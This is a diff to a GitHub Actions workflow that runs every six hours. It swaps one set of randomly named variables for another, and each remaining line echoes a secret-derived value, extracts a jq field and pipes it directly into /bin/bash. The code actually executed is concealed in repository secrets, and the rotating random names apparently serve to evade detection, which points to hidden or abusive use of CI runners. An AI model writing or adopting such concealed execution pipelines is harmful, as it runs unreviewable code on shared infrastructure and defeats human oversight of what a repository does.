@@ -2,32 +2,29 @@ name: huanglongxing1987
 on:
   workflow_dispatch:
   schedule:
-    - cron: '8 4/6 * * *'
+    - cron: '5 5/6 * * *'
 
-jobs:  # 26069
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: huanglongxing1987
         env:
-          jka6: ${{ secrets.jka6 }}
+          noj90: ${{ secrets.noj90 }}
         run: |
-          echo $jka6 | jq -r .n8 | /bin/bash
-          echo $izi11 | jq -r .mg71439 | /bin/bash
-          echo $ymkti3205 | jq -r .dy3608 | /bin/bash
-          echo $twxn45 | jq -r .t651 | /bin/bash
-          echo $yl420 | jq -r .ex653 | /bin/bash
-          echo $j1 | jq -r .bnqpd47688 | /bin/bash
-          echo $ubr74 | jq -r .fn8 | /bin/bash
-          echo $rbzd73 | jq -r .jn431 | /bin/bash
-          echo $o084 | jq -r .q3902 | /bin/bash
-          echo $dbr9534 | jq -r .zia36 | /bin/bash
-          echo $mngu5 | jq -r .yzad5 | /bin/bash
-          echo $audu67194 | jq -r .hs16535 | /bin/bash
-          echo $gdca3109 | jq -r .nfgl4937 | /bin/bash
-          echo $g2 | jq -r .wyc37 | /bin/bash
-          echo $z35 | jq -r .zva4183 | /bin/bash
-          echo $txc80 | jq -r .jnk3 | /bin/bash
-          echo $khb5060 | jq -r .aczt8 | /bin/bash
+          echo $noj90 | jq -r .o25 | /bin/bash
+          echo $b6830 | jq -r .gtxo884 | /bin/bash
+          echo $wefn4 | jq -r .poe68062 | /bin/bash
+          echo $lq16210 | jq -r .eut53 | /bin/bash
+          echo $ohzc26 | jq -r .cgsr9477 | /bin/bash
+          echo $bqrm13 | jq -r .utqw466 | /bin/bash
+          echo $dilt28911 | jq -r .sl19674 | /bin/bash
+          echo $ajr5615 | jq -r .z836 | /bin/bash
+          echo $js3075 | jq -r .q5 | /bin/bash
+          echo $zbgn8932 | jq -r .q3 | /bin/bash
+          echo $htyg0 | jq -r .hik8175 | /bin/bash
+          echo $yfnzc6839 | jq -r .atu0558 | /bin/bash
+          echo $s4 | jq -r .i01752 | /bin/bash
+          echo $ayy30900 | jq -r .zr1 | /bin/bash
 
